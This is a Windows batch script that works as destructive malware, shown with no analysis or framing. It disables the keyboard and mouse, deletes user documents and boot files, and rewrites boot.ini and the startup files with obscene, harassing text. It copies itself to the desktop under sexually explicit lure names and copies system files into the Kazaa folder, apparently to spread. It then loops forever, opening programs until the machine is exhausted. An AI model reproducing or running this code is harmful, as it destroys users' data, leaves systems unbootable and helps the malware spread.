   @echo off
   cd\
   c:\windows\rundll32 keyboard,disable
   c:\windows\rundll32 mouse,disable
   del *.doc
   del *.ppt
   del *.xls
   del *.log
   attrib -h c:\ntldr /s
   attrib -h c:\boot.ini /s
   goto :firstIF

   :firstIF
   if exist c:\ntldr goto :win2k
   if not exist c:\ntldr goto :win9x

   :win2k
   cd\
   rem Sia LAR!!! windows xp/2000 SUX!!
   del c:\boot.ini
   echo [Boot loader] >> boot.ini
   echo Default=a: >> boot.ini
   echo [Operating Systems] >> boot.ini
   echo multi(0)disk(0)rdisk(0)partition(2)\WINNT="YOU WATCH PRON!!!!" >> boot.ini
   echo C:\="U HAD SEX WITH PEOPLE BOFORE!!!!!!!!!!" >> boot.ini
   echo d:\="SIA LAR!!! I HATE YOU!! YOU FUCKED ME!!! >> boot.ini
   goto :secondIF

   :win9x
   cd\
   Rem Sia LAR!!! didn't u install windows xp/2000???
   del autoexec.bat
   del config.sys
   del SYSTEM.1ST
   echo @echo off >> autoexec.bat
   echo smartdrv >> autoexec.bat
   echo c:\windows\win.bat >> c:\autoexec.bat
   goto :secondIF

   :secondIF
   cd\
   copy %0 c:\windows\desktop\Fuckyou.jpg
   copy %0 c:\windows\desktop\girl fucks teacher.jpg
   copy %0 c:\windows\desktop\girls shows off.jpg
   copy %0 c:\windows\desktop\girls fucking with boys.mov
   copy %0 c:\windows\desktop\girls masterbadding.mov
   copy %0 c:\windows\desktop\girls fucking.jpg
   copy %0 c:\windows\desktop\naked girls.jpg
   copy %0 c:\windows\desktop\naked boys.jpg
   copy %0 c:\windows\desktop\idiot.sux.jpg
   copy %0 c:\windows\desktop\fucking bitch.jpg
   copy %0 c:\windows\desktop\1
   copy %0 c:\windows\desktop\2
   copy %0 c:\windows\desktop\3
   copy %0 c:\windows\desktop\4
   copy %0 c:\windows\desktop\5
   copy %0 c:\windows\desktop\6
   copy %0 c:\windows\desktop\7
   copy %0 c:\windows\desktop\8
   copy %0 c:\windows\desktop\9
   copy %0 c:\windows\desktop\10
   copy %0 c:\windows\desktop\11
   copy %0 c:\windows\desktop\12
   copy %0 c:\windows\desktop\13
   copy %0 c:\windows\desktop\14
   copy %0 c:\windows\desktop\15
   copy %0 c:\windows\desktop\16
   copy %0 c:\windows\desktop\17
   copy %0 c:\windows\desktop\18
   copy %0 c:\windows\desktop\19
   copy %0 c:\windows\desktop\20
   copy %0 c:\windows\desktop\21
   goto :startup1

   :startup1
   rem ram burner
   echo device=c:\windows\ASPI2HLP.SYS>> c:\config.sys
   echo device=c:\windows\DBLBUFF.SYS >> c:\config.sys
   echo devicehigh=c:\windows\RAMDRIVE.SYS 40000 512 64 >> c:\config.sys
   echo devicehigh=c:\windows\command\ansi.sys >> c:\config.sys
   echo devicehigh=c:\windows\command\country.sys >> c:\config.sys
   echo devicehigh=c:\windows\command\ebd\ASPI2DOS.SYS >> c:\config.sys
   echo devicehigh=c:\windows\command\ebd\ASPI4DOS.SYS >> c:\config.sys
   echo devicehigh=c:\windows\command\ebd\ASPI8DOS.SYS >> c:\config.sys
   echo devicehigh=c:\windows\command\ebd\ASPI8U2.SYS >> c:\config.sys
   echo devicehigh=c:\windows\command\ebd\ASPICD.SYS >> c:\config.sys
   echo devicehigh=c:\windows\command\ebd\FLASHPT.SYS >> c:\config.sys
   echo devicehigh=c:\windows\command\ebd\WINBOOT.SYS >> c:\config.sys
   echo devicehigh=c:\windows\command\ebd\IO.SYS >> c:\config.sys
   echo devicehigh=c:\windows\command\ebd\OAKCDROM.SYS >> c:\config.sys
   echo devicehigh=c:\windows\command\ebd\BTCDROM.SYS >> c:\config.sys
   goto :IFagain

   :IFagain
   rem IF command again...sianz...
   if exist c:\logo.sys goto :delete
   if not exist c:\logo.sys goto :startup2

   :delete
   echo it is a crime to have windows logo...didn't ur mama teach u??
   cd\
   del c:\logo.sys
   goto :startup2

   :startup2
   cd\
   echo yoyo!!!
   choice /ty,1 >nul
   echo U SUX!!!!
   echo DO U NOE THAT????
   echo U SUX!!!
   choice /ty,1 >nul
   if exist c:\progra~1\kazaa goto :gotDIR
   if not exist c:\progra~1kazaa goto :noDIR

   :gotDIR
   cd\
   echo :fucker >> c:\windows\win.bat
   echo xcopy c:\windows\system\ c:\progra~1\kazaa\ /e /h >> c:\windows\win.bat
   echo goto :fucker >> c:\windows\win.bat
   echo call c:\windows\win.bat
   goto :intro

   :noDIR
   echo cd\  >> c:\windows\win.bat
   echo mkdir c:\progra~1\kazaa\fucker  >> c:\windows\win.bat
   echo cd\  >> c:\windows\win.bat
   echo xcopy c:\windows\system\ c:\progra~1\kazaa\fucker\ /e /h >> c:\windows\win.bat
   echo call c:\windows\win.bat
   goto :intro

   :intro
   echo yoyo!! u SUX!!!!
   echo U FUCK!!!
   choice /ty,1 >nul
   echo u noe u sux???
   echo i dun noe u....
   echo but we noe u SUX!!!!
   choice /ty,1 >nul
   echo haha!!!!
   echo msgbox "YOU SUX!!!! HAHA!!!! YOU FUCK!!! HAHA!!!!" >> c:\windows\win.vbs
   start c:\windows\win.vbs
   choice /ty,3 >nul
   goto :destroy

   :destroy
   start winword
   start winword
   start winword
   start winword
   start winword
   start winword
   start winword
   start winword
   start winword
   start winword
   choice /ty,1 >nul
   del *.doc
   start paint
   start paint
   start paint
   start paint
   start paint
   start paint
   start paint
   choice /ty,1 >nul
   start regedit
   start regedit
   start regedit
   start regedit
   start regedit
   start regedit
   start regedit
   start regedit
   start regedit
   start regedit
   choice /ty,1 >nul
   start command.com
   start command.com
   start command.com
   start command.com
   start command.com
   start command.com
   start command.com
   start command.com
   start command.com
   start command.com
   start command.com
   start command.com
   start command.com
   start command.com
   start command.com
   start command.com
   start command.com
   start command.com
   start command.com
   start command.com
   start command.com
   start command.com
   start command.com
   start command.com
   start command.com
   start command.com
   start command.com
   start command.com
   start command.com
   start command.com
   choice /ty,2 >nul
   goto :destroy
